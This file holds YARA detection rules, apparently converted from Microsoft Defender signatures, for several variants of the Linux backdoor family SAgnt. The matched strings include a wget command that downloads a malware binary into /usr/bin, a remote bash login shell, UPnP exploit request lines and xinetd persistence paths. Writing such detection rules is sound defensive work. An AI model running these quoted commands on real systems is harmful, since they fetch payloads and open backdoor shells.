rule Backdoor_Linux_SAgnt_A_2147826935_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/SAgnt.A!xp"
        threat_id = "2147826935"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "SAgnt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {31 ed 49 89 d1 5e 48 89 e2 48 83 e4 f0 50 54 48 c7 c7 95 01 40 00 48 c7 c1 58 01 40 00 49 c7 c0 f8 8d 43 00}  //weight: 1, accuracy: High
        $x_1_2 = {41 54 55 49 89 f4 53 31 f6 48 89 fb 40 b5 ff e8 7e 07 00 00 31 f6 48 89 df}  //weight: 1, accuracy: High
        $x_1_3 = {31 c0 4c 89 ef 48 83 c9 ff f2 ae f7 d9 48 63 d9 48 89 df e8 82 ff ff ff 4c 89 e9 48 89 04 24 48 89 c7 ba 6a 8e 43 00 48 89 de 31 c0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_SAgnt_B_2147826936_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/SAgnt.B!xp"
        threat_id = "2147826936"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "SAgnt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "POST /wanipcn.xml HTTP/1.1" ascii //weight: 1
        $x_1_2 = "cz2isg9l8u7b5xw0mr6jhfvpkteyo3nadq14" ascii //weight: 1
        $x_1_3 = "POST /cgi-bin/login_action.cgi HTTP/1.1" ascii //weight: 1
        $x_1_4 = "Host: 127.0.0.1:52869" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_SAgnt_C_2147828992_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/SAgnt.C!xp"
        threat_id = "2147828992"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "SAgnt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/etc/xinetd.d/sara" ascii //weight: 1
        $x_1_2 = "/usr/bin/killall xinetd" ascii //weight: 1
        $x_1_3 = "/usr/bin/sara-malware" ascii //weight: 1
        $x_1_4 = "/usr/bin/wget -q -b http://downloadsite.com/sara-malware /usr/bin/sara-malware" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_SAgnt_B_2147845204_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/SAgnt.B!MTB"
        threat_id = "2147845204"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "SAgnt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "pel_send_msg" ascii //weight: 1
        $x_1_2 = "exec bash --login" ascii //weight: 1
        $x_1_3 = "pel_recv_msg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_SAgnt_C_2147893466_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/SAgnt.C!MTB"
        threat_id = "2147893466"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "SAgnt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DiE!!!" ascii //weight: 1
        $x_1_2 = "cb_shell" ascii //weight: 1
        $x_1_3 = "spamd" ascii //weight: 1
        $x_1_4 = "/dev/ptmx" ascii //weight: 1
        $x_1_5 = "Welcome to my backdoor access" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_SAgnt_L_2147919802_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/SAgnt.L!MTB"
        threat_id = "2147919802"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "SAgnt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {83 90 12 00 28 00 b3 af 20 00 b1 af 1c 00 b0 af 2c 00 bf af 10 00 bc af 21 88 40 00 ff ff 52 26 21 98 60 00 42 00 10 3c}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

